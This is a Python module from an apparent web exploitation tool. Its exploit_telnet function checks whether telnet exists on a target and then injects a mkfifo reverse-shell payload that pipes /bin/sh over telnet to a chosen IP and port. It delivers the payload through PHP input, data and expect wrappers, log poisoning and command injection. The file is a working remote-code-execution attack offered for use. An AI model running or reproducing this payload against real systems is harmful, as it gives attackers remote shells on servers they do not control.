"""Telnet"""
from src.httpreqs import request
from src.configs import config
from src.utils.encodings import encode
from src.utils.arguments import ArgumentHandler
from src.attacks.logPoison import exploit_log_poison
from src.utils.info import printInfo
from src.utils import colors


def exploit_telnet(exploit, method, ip, port):
    """Exploit telnet"""
    args = ArgumentHandler()
    url = exploit["GETVAL"]
    post = exploit["POSTVAL"]

    telnetTest = "which%20telnet"
    telnetPayload = f"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{ip}+{port}+>/tmp/f"

    print(
        colors.purple("[.]")
        + " Checking if telnet is available on the target system..."
    )

    if method == "INPUT":
        res, _ = request.REQUEST(
            url.replace(config.tempArg, encode(telnetTest)),
            args.args['httpheaders'],
            exploit["POSTVAL"],
            config.proxies,
            "",
            "",
        )

        if "/bin" in res.text and "/telnet" in res.text:
            u = url.replace(config.tempArg, encode(telnetPayload))
            printInfo(ip, port, "telnet", "input wrapper")
            request.REQUEST(
                u, args.args['httpheaders'], exploit["POSTVAL"], config.proxies, "", ""
            )
            return True

    if method == "DATA":
        if args.args['postreq']:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(telnetTest)),
                args.args['httpheaders'],
                post,
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(telnetTest)),
                args.args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )

        if "/bin" in res.text and "/telnet" in res.text:
            u = url.replace(config.tempArg, encode(telnetPayload))
            printInfo(ip, port, "telnet", "data wrapper")
            if args.args['postreq']:
                request.REQUEST(
                    url.replace(config.tempArg, encode(telnetPayload)),
                    args.args['httpheaders'],
                    post,
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(u, args.args['httpheaders'], "", config.proxies, "", "")
            return True

    if method == "EXPECT":
        if args.args['postreq']:
            res, _ = request.REQUEST(
                url,
                args.args['httpheaders'],
                post.replace(config.tempArg, encode(telnetPayload)),
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(telnetTest)),
                args.args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )

        if "/bin" in res.text and "/telnet" in res.text:
            u = url.replace(config.tempArg, encode(telnetPayload))
            printInfo(ip, port, "telnet", "expect wrapper")
            if args.args['postreq']:
                request.REQUEST(
                    url,
                    args.args['httpheaders'],
                    post.replace(config.tempArg, encode(telnetPayload)),
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(u, args.args['httpheaders'], "", config.proxies, "", "")
            return True

    if method == "TRUNC":
        exploit_log_poison(
            ip,
            port,
            url,
            encode(telnetPayload),
            "",
            encode(telnetTest),
            "/telnet",
            exploit["POSTVAL"],
        )
        return True

    if method == "CMD":
        if args.args['postreq']:
            res, _ = request.REQUEST(
                url,
                args.args['httpheaders'],
                post.replace(config.tempArg, encode(telnetTest)),
                config.proxies,
                "",
                "",
            )
        else:
            res, _ = request.REQUEST(
                url.replace(config.tempArg, encode(telnetTest)),
                args.args['httpheaders'],
                "",
                config.proxies,
                "",
                "",
            )

        if "/bin" in res.text and "/telnet" in res.text:
            printInfo(ip, port, "telnet", "command injection")
            if args.args['postreq']:
                request.REQUEST(
                    url,
                    args.args['httpheaders'],
                    post.replace(config.tempArg, encode(telnetPayload)),
                    config.proxies,
                    "",
                    "",
                )
            else:
                request.REQUEST(
                    url.replace(config.tempArg, encode(telnetPayload)),
                    args.args['httpheaders'],
                    "",
                    config.proxies,
                    "",
                    "",
                )
            return True
